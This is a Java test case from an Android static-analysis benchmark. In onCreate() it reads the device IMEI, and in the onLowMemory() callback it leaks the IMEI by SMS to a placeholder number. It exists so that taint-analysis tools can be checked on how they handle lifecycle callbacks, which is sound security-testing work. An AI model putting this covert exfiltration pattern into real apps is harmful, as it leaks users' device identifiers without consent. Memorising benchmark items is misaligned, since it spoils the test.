package de.ecspride;

import android.app.Application;
import android.content.Context;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name ApplicationLifecycle2
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description A secret value is obtained on application start and leaked in the low memory
 * 	callback.
 * @dataflow source -> onCreate() -> imei -> onLowMemory() -> sink
 * @number_of_leaks 1
 * @challenges Correct handling of callbacks in the Application object
 */
public class ApplicationLifecyle2 extends Application {

	private String imei;
	
	@Override
	public void onCreate() {
		super.onCreate();
		
		TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		imei = tm.getDeviceId();
	}

	@Override
	public void onLowMemory() {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
	}

}
